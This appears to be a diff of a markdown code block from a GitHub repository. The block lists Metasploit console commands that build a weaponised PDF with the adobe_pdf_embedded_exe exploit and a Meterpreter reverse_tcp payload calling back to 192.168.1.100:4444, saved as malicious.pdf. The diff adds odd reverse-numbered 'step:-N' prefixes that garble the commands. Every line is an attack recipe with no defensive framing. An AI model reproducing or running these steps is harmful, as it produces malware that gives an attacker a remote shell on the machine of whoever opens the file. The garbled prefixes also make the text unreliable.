@@ -1,27 +1,27 @@
 ```
-msfconsole
+step:-1 msfconsole
 
 # Search for PDF exploits
-search pdf
+step:-2 search pdf
 
 # Use the selected exploit
-use exploit/windows/fileformat/adobe_pdf_embedded_exe
+step:-3 use exploit/windows/fileformat/adobe_pdf_embedded_exe
 
 # Set the payload
-set payload windows/meterpreter/reverse_tcp
+step:-4 set payload windows/meterpreter/reverse_tcp
 
 # Configure the payload options
-set LHOST 192.168.1.100
-set LPORT 4444
+step:-5 set LHOST 192.168.1.100
+step:-6 set LPORT 4444
 
 # Set the output file name
-set FILENAME malicious.pdf
+step:-7 set FILENAME malicious.pdf
 
 # Set the path to the miscellaneous file
-set SRC /path/to/your/miscellaneous/file.exe
+step:-8 set SRC /path/to/your/miscellaneous/file.exe
 
 # Generate the malicious PDF
-exploit
+step:-9 exploit
 ```
 <!--
 <img src="https://github.com/Divyanshu-85/Required-Document/blob/main/Ai-img/1000180561-removebg-preview.png" height="200px">
